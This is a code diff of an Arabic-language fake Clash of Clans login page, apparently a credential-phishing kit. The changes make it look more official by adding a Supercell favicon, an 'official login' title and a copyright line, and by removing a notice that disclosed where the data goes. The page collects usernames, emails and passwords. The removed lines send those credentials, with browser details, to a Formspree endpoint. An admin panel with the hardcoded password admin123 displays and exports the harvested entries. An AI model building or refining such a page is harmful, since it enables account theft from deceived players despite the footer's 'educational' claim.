@@ -3,10 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - كلاش أوف كلانس</title>
+    <title>Clash of Clans - تسجيل الدخول الرسمي</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="https://supercell.com/images/5a8f16a7101e2ee5520c3084/favicon.ico">
     <style>
+        :root {
+            --primary-blue: #1a237e;
+            --dark-blue: #0d47a1;
+            --gold: #FFD700;
+            --orange: #FF8F00;
+            --dark-gold: #b8860b;
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -15,19 +24,20 @@
         }
 
         body {
-            background: linear-gradient(to bottom, #1a237e, #0d47a1);
-            color: #fff;
+            background: linear-gradient(135deg, var(--primary-blue), var(--dark-blue));
+            color: white;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            overflow-x: hidden;
             padding: 20px;
             position: relative;
+            overflow-x: hidden;
         }
 
-        .background-effects {
+        /* تأثيرات الخلفية */
+        .particles {
             position: absolute;
             top: 0;
             left: 0;
@@ -37,234 +47,308 @@
             z-index: -1;
         }
 
-        .castle {
+        .particle {
             position: absolute;
-            bottom: 0;
-            left: 5%;
-            width: 200px;
-            height: 200px;
-            background: linear-gradient(to top, #8B4513, #A0522D);
-            clip-path: polygon(0% 100%, 20% 40%, 40% 60%, 50% 30%, 60% 60%, 80% 40%, 100% 100%);
+            background-color: var(--gold);
+            border-radius: 50%;
             opacity: 0.3;
         }
 
-        .tower {
-            position: absolute;
-            bottom: 0;
-            right: 10%;
-            width: 120px;
-            height: 250px;
-            background: linear-gradient(to top, #5D4037, #8D6E63);
-            border-radius: 20px 20px 0 0;
-            opacity: 0.3;
-        }
-
-        .container {
-            background-color: rgba(0, 0, 0, 0.7);
-            border-radius: 15px;
-            border: 3px solid #FFD700;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+        /* شريط التنقل العلوي */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 500px;
-            padding: 30px;
+            background: rgba(0, 0, 0, 0.9);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            border-bottom: 3px solid var(--gold);
+        }
+
+        .nav-logo {
+            height: 40px;
+            filter: drop-shadow(0 0 5px var(--gold));
+        }
+
+        .nav-links a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--gold);
+        }
+
+        /* الحاوية الرئيسية */
+        .main-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 40px;
+            max-width: 1200px;
+            margin-top: 80px;
+        }
+
+        /* قسم الصورة */
+        .image-section {
+            flex: 1;
+            min-width: 300px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
 
-        .logo-container {
-            margin-bottom: 25px;
-            position: relative;
+        .game-image {
+            max-width: 100%;
+            border-radius: 20px;
+            border: 5px solid var(--gold);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            animation: float 3s ease-in-out infinite;
         }
 
-        .logo {
-            max-width: 200px;
-            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.8));
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
         }
 
-        .crown {
-            color: #FFD700;
-            font-size: 24px;
-            position: absolute;
-            top: -15px;
-            left: 50%;
-            transform: translateX(-50%);
+        /* قسم تسجيل الدخول */
+        .login-section {
+            flex: 1;
+            min-width: 350px;
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 20px;
+            padding: 40px 30px;
+            border: 3px solid var(--gold);
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
         }
 
-        h1 {
-            color: #FFD700;
-            margin-bottom: 5px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            font-size: 28px;
-        }
-
-        .subtitle {
-            color: #BDBDBD;
+        .logo-header {
+            text-align: center;
             margin-bottom: 30px;
-            font-size: 16px;
         }
 
-        .form-container {
+        .main-logo {
+            max-width: 250px;
+            filter: drop-shadow(0 0 10px var(--gold));
+        }
+
+        .page-title {
+            color: var(--gold);
+            font-size: 28px;
+            margin: 10px 0 5px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .page-subtitle {
+            color: #aaa;
+            font-size: 16px;
+            margin-bottom: 25px;
+        }
+
+        /* نموذج التسجيل */
+        .login-form {
             display: flex;
             flex-direction: column;
             gap: 20px;
         }
 
-        .form-section {
-            background: rgba(255, 215, 0, 0.1);
-            border-radius: 10px;
-            padding: 20px;
-            border: 1px solid #FFD700;
-        }
-
-        .section-title {
-            color: #FFD700;
-            margin-bottom: 15px;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
         .input-group {
             position: relative;
             text-align: right;
-            margin-bottom: 15px;
         }
 
-        .input-group label {
+        .input-label {
             display: block;
             margin-bottom: 8px;
-            color: #FFD700;
+            color: var(--gold);
             font-weight: 600;
             font-size: 16px;
-            text-align: right;
         }
 
         .input-field {
             width: 100%;
-            padding: 15px 15px 15px 45px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border: 2px solid #FFD700;
-            border-radius: 8px;
+            padding: 15px 45px 15px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid var(--gold);
+            border-radius: 10px;
             color: white;
             font-size: 16px;
             transition: all 0.3s;
-            text-align: right;
         }
 
         .input-field:focus {
             outline: none;
-            background-color: rgba(255, 255, 255, 0.15);
-            box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
         }
 
         .input-icon {
             position: absolute;
-            right: 15px;
+            left: 15px;
             top: 45px;
-            color: #FFD700;
+            color: var(--gold);
             font-size: 18px;
         }
 
-        .privacy-notice {
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid #ff4444;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: right;
-        }
-
-        .privacy-notice h3 {
-            color: #ff4444;
-            margin-bottom: 10px;
-        }
-
-        .privacy-checkbox {
+        /* خيارات إضافية */
+        .form-options {
             display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            margin: 15px 0;
-            text-align: right;
+            justify-content: space-between;
+            align-items: center;
+            margin: 10px 0;
         }
 
-        .privacy-checkbox input {
-            margin-top: 3px;
-            accent-color: #FFD700;
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
         }
 
-        .privacy-checkbox label {
-            color: #BDBDBD;
+        .remember-me input {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--gold);
+        }
+
+        .forgot-link {
+            color: #4FC3F7;
+            text-decoration: none;
             font-size: 14px;
         }
 
-        .privacy-checkbox a {
-            color: #4FC3F7;
-            text-decoration: none;
-        }
-
-        .privacy-checkbox a:hover {
+        .forgot-link:hover {
             text-decoration: underline;
         }
 
-        .login-button {
-            background: linear-gradient(to bottom, #FFD700, #FF8F00);
-            color: #5D4037;
+        /* زر التسجيل */
+        .login-btn {
+            background: linear-gradient(135deg, var(--gold), var(--orange));
+            color: #1a237e;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             padding: 16px;
             font-size: 18px;
             font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
-            margin-top: 20px;
+            margin-top: 10px;
             box-shadow: 0 5px 15px rgba(255, 143, 0, 0.4);
-            width: 100%;
         }
 
-        .login-button:hover:not(:disabled) {
-            background: linear-gradient(to bottom, #FFC400, #FF6F00);
+        .login-btn:hover {
+            background: linear-gradient(135deg, #ffcc00, #ff7700);
             transform: translateY(-3px);
             box-shadow: 0 8px 20px rgba(255, 143, 0, 0.6);
         }
 
-        .login-button:disabled {
-            opacity: 0.5;
+        .login-btn:disabled {
+            opacity: 0.6;
             cursor: not-allowed;
         }
 
-        .response-message {
-            margin-top: 20px;
+        /* الروابط الإضافية */
+        .extra-links {
+            margin-top: 25px;
+            text-align: center;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #aaa;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: var(--gold);
+            opacity: 0.5;
+        }
+
+        .divider::before {
+            margin-left: 10px;
+        }
+
+        .divider::after {
+            margin-right: 10px;
+        }
+
+        .secondary-btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: rgba(255, 215, 0, 0.1);
+            color: var(--gold);
+            border: 2px solid var(--gold);
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 10px;
+        }
+
+        .secondary-btn:hover {
+            background: rgba(255, 215, 0, 0.2);
+        }
+
+        /* قسم المعلومات */
+        .info-section {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid var(--gold);
+            border-radius: 10px;
             padding: 15px;
-            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .info-section h4 {
+            color: var(--gold);
+            margin-bottom: 10px;
+        }
+
+        /* رسائل النظام */
+        .message-box {
+            padding: 15px;
+            border-radius: 10px;
             text-align: center;
             font-weight: bold;
+            margin: 15px 0;
             display: none;
         }
 
         .success {
-            background-color: rgba(76, 175, 80, 0.2);
+            background: rgba(76, 175, 80, 0.2);
             border: 2px solid #4CAF50;
             color: #4CAF50;
             display: block;
         }
 
         .error {
-            background-color: rgba(244, 67, 54, 0.2);
+            background: rgba(244, 67, 54, 0.2);
             border: 2px solid #f44336;
             color: #f44336;
             display: block;
         }
 
-        .loading {
+        /* مؤشر التحميل */
+        .loader {
             display: inline-block;
             width: 20px;
             height: 20px;
             border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
-            border-top-color: #FFD700;
+            border-top-color: var(--gold);
             animation: spin 1s ease-in-out infinite;
             margin-right: 10px;
         }
@@ -273,218 +357,371 @@
             to { transform: rotate(360deg); }
         }
 
-        .admin-panel-link {
-            margin-top: 20px;
+        /* التذييل */
+        footer {
+            margin-top: 40px;
             text-align: center;
-        }
-
-        .admin-panel-link a {
-            color: #FFD700;
-            text-decoration: none;
+            color: #aaa;
             font-size: 14px;
+            padding: 20px;
+            width: 100%;
         }
 
-        .admin-panel-link a:hover {
-            text-decoration: underline;
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
         }
 
-        .formspree-info {
-            background: rgba(33, 150, 243, 0.1);
-            border: 1px solid #2196F3;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            font-size: 14px;
-            text-align: right;
+        .social-icon {
+            color: var(--gold);
+            font-size: 24px;
+            transition: transform 0.3s;
         }
 
-        .formspree-info a {
-            color: #2196F3;
-            text-decoration: none;
+        .social-icon:hover {
+            transform: scale(1.2);
         }
 
+        /* نافذة البيانات */
+        .data-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2000;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .modal-content {
+            background: white;
+            color: #333;
+            max-width: 800px;
+            margin: 50px auto;
+            border-radius: 15px;
+            padding: 30px;
+            border: 3px solid var(--gold);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 15px;
+        }
+
+        .modal-title {
+            color: var(--primary-blue);
+            font-size: 24px;
+        }
+
+        .close-btn {
+            background: #f44336;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        /* تخصيص للهاتف */
         @media (max-width: 768px) {
-            .container {
-                padding: 20px;
-                max-width: 90%;
+            .navbar {
+                padding: 10px 15px;
             }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .main-container {
+                flex-direction: column;
+                margin-top: 60px;
+            }
+            
+            .login-section {
+                width: 100%;
+                padding: 25px 20px;
+            }
+            
+            .form-options {
+                flex-direction: column;
+                gap: 10px;
+                align-items: flex-start;
+            }
+        }
+
+        /* تحسينات للألعاب */
+        .game-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .feature {
+            background: rgba(255, 215, 0, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .feature i {
+            color: var(--gold);
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .feature h4 {
+            color: white;
+            margin-bottom: 5px;
+        }
+
+        .feature p {
+            color: #aaa;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <!-- خلفية اللعبة -->
-    <div class="background-effects">
-        <div class="castle"></div>
-        <div class="tower"></div>
-    </div>
-
-    <!-- الحاوية الرئيسية -->
-    <div class="container">
-        <!-- الشعار -->
-        <div class="logo-container">
-            <div class="crown">👑</div>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/2560px-Clash_of_Clans_Logo.svg.png" alt="Clash of Clans Logo" class="logo">
+    <!-- شريط التنقل العلوي -->
+    <nav class="navbar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/2560px-Clash_of_Clans_Logo.svg.png" 
+             alt="Clash of Clans Logo" class="nav-logo">
+        <div class="nav-links">
+            <a href="#"><i class="fas fa-home"></i> الرئيسية</a>
+            <a href="#"><i class="fas fa-gamepad"></i> اللعبة</a>
+            <a href="#"><i class="fas fa-users"></i> المجتمع</a>
+            <a href="#"><i class="fas fa-shopping-cart"></i> المتجر</a>
+            <a href="#"><i class="fas fa-question-circle"></i> المساعدة</a>
         </div>
+    </nav>
 
-        <!-- العنوان -->
-        <h1>تسجيل الدخول</h1>
-        <p class="subtitle">ادخل إلى قريتك واستأنف المعركة</p>
+    <!-- تأثيرات الجسيمات -->
+    <div class="particles" id="particles"></div>
 
-        <!-- معلومات Formspree -->
-        <div class="formspree-info">
-            <i class="fas fa-info-circle"></i> 
-            البيانات سترسل إلى البريد الإلكتروني المسجل في Formspree.
-            <a href="#" id="setupFormspreeLink">كيفية إعداد Formspree؟</a>
-        </div>
-
-        <!-- إشعار الخصوصية -->
-        <div class="privacy-notice">
-            <h3><i class="fas fa-exclamation-triangle"></i> إشعار مهم</h3>
-            <p>بيانات تسجيل الدخول سيتم حفظها في متصفحك وإرسالها إلى البريد الإلكتروني المسؤول.</p>
-        </div>
-
-        <!-- نموذج التسجيل -->
-        <div class="form-container">
-            <div class="form-section">
-                <h3 class="section-title"><i class="fas fa-user"></i> بيانات الحساب</h3>
-                
-                <div class="input-group">
-                    <label for="username">اسم المستخدم</label>
-                    <input type="text" id="username" class="input-field" placeholder="أدخل اسم المستخدم" required>
-                    <div class="input-icon"><i class="fas fa-user"></i></div>
+    <!-- المحتوى الرئيسي -->
+    <div class="main-container">
+        <!-- قسم الصورة -->
+        <div class="image-section">
+            <img src="https://images.contentstack.io/v3/assets/blt4300410acb6b2f5b/blt3ad0b6b65e7c6f15/62ea7c3078b0c34a1c5cff98/troops-hero.png" 
+                 alt="Clash of Clans Game" class="game-image">
+            
+            <div class="game-features">
+                <div class="feature">
+                    <i class="fas fa-shield-alt"></i>
+                    <h4>بناء القرية</h4>
+                    <p>قم ببناء وتطوير قريتك</p>
                 </div>
-
-                <div class="input-group">
-                    <label for="email">البريد الإلكتروني</label>
-                    <input type="email" id="email" class="input-field" placeholder="أدخل بريدك الإلكتروني" required>
-                    <div class="input-icon"><i class="fas fa-envelope"></i></div>
+                <div class="feature">
+                    <i class="fas fa-users"></i>
+                    <h4>انضم إلى عشيرة</h4>
+                    <p>قاتل مع لاعبين آخرين</p>
                 </div>
-
-                <div class="input-group">
-                    <label for="password">كلمة المرور</label>
-                    <input type="password" id="password" class="input-field" placeholder="أدخل كلمة المرور" required>
-                    <div class="input-icon"><i class="fas fa-lock"></i></div>
+                <div class="feature">
+                    <i class="fas fa-trophy"></i>
+                    <h4>احصد الجوائز</h4>
+                    <p>ارفع مستوى قوتك</p>
+                </div>
+                <div class="feature">
+                    <i class="fas fa-crown"></i>
+                    <h4>كن الأسطورة</h4>
+                    <p>صل إلى أعلى المراتب</p>
                 </div>
             </div>
+        </div>
 
-            <div class="form-section">
-                <h3 class="section-title"><i class="fas fa-gamepad"></i> معلومات اللعبة</h3>
-                
+        <!-- قسم تسجيل الدخول -->
+        <div class="login-section">
+            <div class="logo-header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/1200px-Clash_of_Clans_Logo.svg.png" 
+                     alt="Clash of Clans" class="main-logo">
+                <h1 class="page-title">تسجيل الدخول</h1>
+                <p class="page-subtitle">استأنف رحلتك في عالم كلاش أوف كلانس</p>
+            </div>
+
+            <!-- رسائل النظام -->
+            <div id="messageBox" class="message-box"></div>
+
+            <!-- نموذج تسجيل الدخول -->
+            <form class="login-form" id="loginForm">
+                <!-- حقل اسم المستخدم -->
                 <div class="input-group">
-                    <label for="playerLevel">مستوى اللاعب</label>
+                    <label class="input-label">
+                        <i class="fas fa-user"></i> اسم المستخدم أو البريد الإلكتروني
+                    </label>
+                    <input type="text" 
+                           id="username" 
+                           class="input-field" 
+                           placeholder="أدخل اسم المستخدم أو البريد الإلكتروني"
+                           required>
+                    <div class="input-icon">
+                        <i class="fas fa-user-circle"></i>
+                    </div>
+                </div>
+
+                <!-- حقل كلمة المرور -->
+                <div class="input-group">
+                    <label class="input-label">
+                        <i class="fas fa-lock"></i> كلمة المرور
+                    </label>
+                    <input type="password" 
+                           id="password" 
+                           class="input-field" 
+                           placeholder="أدخل كلمة المرور"
+                           required>
+                    <div class="input-icon">
+                        <i class="fas fa-key"></i>
+                    </div>
+                </div>
+
+                <!-- حقل مستوى اللاعب -->
+                <div class="input-group">
+                    <label class="input-label">
+                        <i class="fas fa-trophy"></i> مستوى اللاعب
+                    </label>
                     <select id="playerLevel" class="input-field">
                         <option value="">اختر مستوى اللاعب</option>
                         <option value="1-50">المستويات 1-50 (مبتدئ)</option>
                         <option value="51-100">المستويات 51-100 (متوسط)</option>
                         <option value="101-150">المستويات 101-150 (متقدم)</option>
                         <option value="151+">المستوى 151+ (محترف)</option>
+                        <option value="أسطورة">أسطورة</option>
                     </select>
-                    <div class="input-icon"><i class="fas fa-chart-line"></i></div>
+                    <div class="input-icon">
+                        <i class="fas fa-chart-line"></i>
+                    </div>
                 </div>
 
+                <!-- حقل اسم العشيرة -->
                 <div class="input-group">
-                    <label for="clanName">اسم العشيرة (اختياري)</label>
-                    <input type="text" id="clanName" class="input-field" placeholder="اسم العشيرة">
-                    <div class="input-icon"><i class="fas fa-users"></i></div>
+                    <label class="input-label">
+                        <i class="fas fa-users"></i> اسم العشيرة (اختياري)
+                    </label>
+                    <input type="text" 
+                           id="clanName" 
+                           class="input-field" 
+                           placeholder="اسم العشيرة">
+                    <div class="input-icon">
+                        <i class="fas fa-flag"></i>
+                    </div>
                 </div>
+
+                <!-- خيارات إضافية -->
+                <div class="form-options">
+                    <label class="remember-me">
+                        <input type="checkbox" id="rememberMe">
+                        تذكرني على هذا الجهاز
+                    </label>
+                    <a href="#" class="forgot-link">نسيت كلمة المرور؟</a>
+                </div>
+
+                <!-- زر تسجيل الدخول -->
+                <button type="button" class="login-btn" id="loginBtn">
+                    <span id="btnText">تسجيل الدخول إلى اللعبة</span>
+                    <span id="btnLoader" class="loader" style="display: none;"></span>
+                </button>
+            </form>
+
+            <!-- معلومات إضافية -->
+            <div class="info-section">
+                <h4><i class="fas fa-info-circle"></i> معلومات مهمة</h4>
+                <p>تأكد من استخدام حسابك الرسمي في كلاش أوف كلانس</p>
             </div>
-
-            <!-- حقل مخفي لـ Formspree -->
-            <input type="hidden" id="formspreeSubject" value="تسجيل دخول جديد - كلاش أوف كلانس">
-
-            <!-- موافقة الخصوصية -->
-            <div class="privacy-checkbox">
-                <input type="checkbox" id="privacyAgreement" required>
-                <label for="privacyAgreement">
-                    أوافق على <a href="#privacyModal" id="privacyPolicyLink">سياسة الخصوصية</a> وأعرف أن بياناتي ستتم معالجتها لأغراض إدارة اللعبة.
-                </label>
-            </div>
-
-            <!-- زر التسجيل -->
-            <button class="login-button" id="loginButton">
-                <span id="buttonText">تسجيل الدخول إلى اللعبة</span>
-                <span id="buttonLoading" class="loading" style="display: none;"></span>
-            </button>
-
-            <!-- رسالة الاستجابة -->
-            <div id="responseMessage" class="response-message"></div>
 
             <!-- روابط إضافية -->
-            <div class="admin-panel-link">
-                <a href="#" id="viewDataLink">👁️ عرض البيانات المحفوظة</a> | 
-                <a href="#" id="setupLink">⚙️ إعداد Formspree</a>
+            <div class="extra-links">
+                <div class="divider">أو</div>
+                <button class="secondary-btn" id="createAccountBtn">
+                    <i class="fas fa-user-plus"></i> إنشاء حساب جديد
+                </button>
+                <button class="secondary-btn" id="playAsGuestBtn">
+                    <i class="fas fa-user-secret"></i> الدخول كضيف
+                </button>
+                <button class="secondary-btn" id="viewDataBtn">
+                    <i class="fas fa-database"></i> عرض البيانات المحفوظة
+                </button>
             </div>
         </div>
     </div>
 
-    <!-- نافذة إعداد Formspree -->
-    <div id="formspreeModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; padding: 20px;">
-        <div style="background: white; color: black; max-width: 600px; margin: 50px auto; padding: 30px; border-radius: 10px; max-height: 80vh; overflow-y: auto;">
-            <h2 style="color: #1a237e; margin-bottom: 20px;">⚙️ إعداد Formspree</h2>
-            <p><strong>الخطوات:</strong></p>
-            <ol style="margin: 15px 0; padding-right: 20px;">
-                <li>اذهب إلى <a href="https://formspree.io" target="_blank">formspree.io</a></li>
-                <li>سجل بحساب Google</li>
-                <li>اضغط على "+ New Form"</li>
-                <li>اختر "HTML Form"</li>
-                <li>انسخ الرابط الذي يظهر (مثل: https://formspree.io/f/xxxxxxxx)</li>
-                <li>الصق الرابط في الحقل أدناه</li>
-            </ol>
-            
-            <div style="margin: 20px 0;">
-                <label style="display: block; margin-bottom: 10px; color: #1a237e;">🔗 رابط Formspree الخاص بك:</label>
-                <input type="text" id="formspreeUrl" placeholder="https://formspree.io/f/xxxxxxxx" 
-                       style="width: 100%; padding: 10px; border: 2px solid #1a237e; border-radius: 5px;">
-                <button onclick="saveFormspreeUrl()" style="background: #1a237e; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin-top: 10px; width: 100%;">
-                    حفظ الرابط
-                </button>
-            </div>
-            
-            <button onclick="closeFormspreeModal()" style="background: #f44336; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin-top: 10px;">
-                إغلاق
-            </button>
+    <!-- تذييل الصفحة -->
+    <footer>
+        <div class="social-links">
+            <a href="#" class="social-icon"><i class="fab fa-facebook"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-youtube"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-discord"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-instagram"></i></a>
         </div>
-    </div>
+        <p>© 2024 Supercell. جميع الحقوق محفوظة.</p>
+        <p>Clash of Clans هي علامة تجارية لشركة Supercell.</p>
+        <p>هذه الصفحة لأغراض تعليمية وتطويرية فقط.</p>
+        <p style="margin-top: 10px; font-size: 12px; color: #888;">
+            <a href="#" style="color: #888; text-decoration: none;">سياسة الخصوصية</a> | 
+            <a href="#" style="color: #888; text-decoration: none;">شروط الخدمة</a>
+        </p>
+    </footer>
 
     <!-- نافذة عرض البيانات -->
-    <div id="dataModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; padding: 20px;">
-        <div style="background: white; color: black; max-width: 800px; margin: 20px auto; padding: 20px; border-radius: 10px; max-height: 90vh; overflow-y: auto;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h2 style="color: #1a237e;">📊 البيانات المحفوظة</h2>
-                <button onclick="closeDataModal()" style="background: #f44336; color: white; border: none; padding: 8px 15px; border-radius: 5px;">✕ إغلاق</button>
+    <div id="dataModal" class="data-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">📊 البيانات المحفوظة</h2>
+                <button class="close-btn" onclick="closeDataModal()">✕ إغلاق</button>
             </div>
             
-            <div id="adminLogin" style="display: block;">
-                <h3 style="color: #1a237e; margin-bottom: 15px;">🔐 دخول المسؤول</h3>
-                <input type="password" id="adminPassword" placeholder="كلمة مرور المسؤول" 
-                       style="width: 100%; padding: 10px; border: 2px solid #1a237e; border-radius: 5px; margin-bottom: 10px;">
-                <button onclick="loginAdmin()" style="background: #1a237e; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px;">
-                    دخول
+            <div id="adminLogin">
+                <h3 style="color: #1a237e; margin-bottom: 15px; text-align: center;">
+                    <i class="fas fa-lock"></i> دخول المسؤول
+                </h3>
+                <input type="password" 
+                       id="adminPassword" 
+                       placeholder="أدخل كلمة مرور المسؤول" 
+                       style="width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #1a237e; border-radius: 8px;">
+                <button onclick="loginAdmin()" 
+                        style="width: 100%; padding: 12px; background: #1a237e; color: white; border: none; border-radius: 8px; cursor: pointer;">
+                    <i class="fas fa-sign-in-alt"></i> دخول
                 </button>
-                <p style="color: #666; margin-top: 10px; font-size: 14px;">
+                <p style="text-align: center; color: #666; margin-top: 10px;">
                     كلمة المرور الافتراضية: <code>admin123</code>
                 </p>
             </div>
             
             <div id="dataContent" style="display: none;">
                 <div style="background: #f5f5f5; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
-                    <h3 style="color: #1a237e;">📈 الإحصائيات</h3>
-                    <p id="statsInfo">جاري التحميل...</p>
+                    <h3 style="color: #1a237e; margin-bottom: 10px;">
+                        <i class="fas fa-chart-bar"></i> الإحصائيات
+                    </h3>
+                    <div id="statsInfo" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px;">
+                        <!-- سيتم ملؤها بالبيانات -->
+                    </div>
                 </div>
                 
-                <div id="dataList">
-                    <!-- البيانات ستظهر هنا -->
+                <div id="dataList" style="max-height: 400px; overflow-y: auto; padding: 10px; border: 1px solid #eee; border-radius: 8px;">
+                    <!-- قائمة البيانات ستظهر هنا -->
                 </div>
                 
-                <div style="margin-top: 20px; display: flex; gap: 10px; justify-content: center;">
-                    <button onclick="exportData()" style="background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px;">
-                        📥 تصدير JSON
+                <div style="display: flex; gap: 10px; margin-top: 20px; justify-content: center;">
+                    <button onclick="exportData()" 
+                            style="padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                        <i class="fas fa-download"></i> تصدير JSON
                     </button>
-                    <button onclick="clearAllData()" style="background: #f44336; color: white; padding: 10px 20px; border: none; border-radius: 5px;">
-                        🗑️ حذف الكل
+                    <button onclick="clearAllData()" 
+                            style="padding: 10px 20px; background: #f44336; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                        <i class="fas fa-trash"></i> حذف الكل
                     </button>
-                    <button onclick="refreshData()" style="background: #2196F3; color: white; padding: 10px 20px; border: none; border-radius: 5px;">
-                        🔄 تحديث
+                    <button onclick="loadSavedData()" 
+                            style="padding: 10px 20px; background: #2196F3; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                        <i class="fas fa-sync"></i> تحديث
                     </button>
                 </div>
             </div>
@@ -492,203 +729,283 @@
     </div>
 
     <script>
-        // تكوين Formspree - غير هذا الرابط برابطك الخاص
-        let FORMSPREE_URL = localStorage.getItem('formspree_url') || 'https://formspree.io/f/xknnprjn';
+        // ========== تهيئة المتغيرات ==========
+        const ADMIN_PASSWORD = "admin123";
+        let formspreeConfigured = false;
         
-        // كلمة مرور المسؤول
-        const ADMIN_PASSWORD = 'admin123';
-        
-        // عناصر DOM
-        const loginButton = document.getElementById('loginButton');
-        const buttonText = document.getElementById('buttonText');
-        const buttonLoading = document.getElementById('buttonLoading');
-        const responseMessage = document.getElementById('responseMessage');
-        const viewDataLink = document.getElementById('viewDataLink');
-        const setupLink = document.getElementById('setupLink');
-        const formspreeModal = document.getElementById('formspreeModal');
+        // ========== عناصر DOM ==========
+        const loginBtn = document.getElementById('loginBtn');
+        const btnText = document.getElementById('btnText');
+        const btnLoader = document.getElementById('btnLoader');
+        const messageBox = document.getElementById('messageBox');
         const dataModal = document.getElementById('dataModal');
+        const particlesContainer = document.getElementById('particles');
 
-        // دالة حفظ البيانات
-        async function saveLoginData() {
-            // جمع البيانات
-            const userData = {
-                username: document.getElementById('username').value,
-                email: document.getElementById('email').value,
-                password: document.getElementById('password').value,
-                playerLevel: document.getElementById('playerLevel').value,
-                clanName: document.getElementById('clanName').value || 'لا يوجد',
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`
-            };
-
